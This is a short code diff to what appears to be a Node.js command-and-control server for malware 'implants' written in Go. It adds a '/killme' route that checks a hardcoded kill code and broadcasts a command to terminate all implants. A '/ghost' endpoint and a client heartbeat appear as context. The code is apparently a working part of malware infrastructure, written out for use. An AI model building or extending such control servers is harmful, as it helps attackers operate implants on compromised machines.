@@ -74,6 +74,17 @@ app.post('/ghost', (req, res) => {
   res.json({success: true});
 });
 
+// KILL SWITCH — LETS YOU NUKE ALL IMPLANTS
+app.get('/killme', (req, res) => {
+  const code = req.query.code;
+  if (code === "CENTRALI_KILL_999") {  // ← must match your Go code
+    broadcast({ kill: true });        // optional: tell dashboard
+    res.send("KILL COMMAND SENT — ALL IMPLANTS DYING");
+  } else {
+    res.status(403).send("WRONG KILL CODE");
+  }
+});
+
 // Heartbeat
 setInterval(() => {
   clients.forEach(c => { try { c.write(': ping\n\n'); } catch {} });
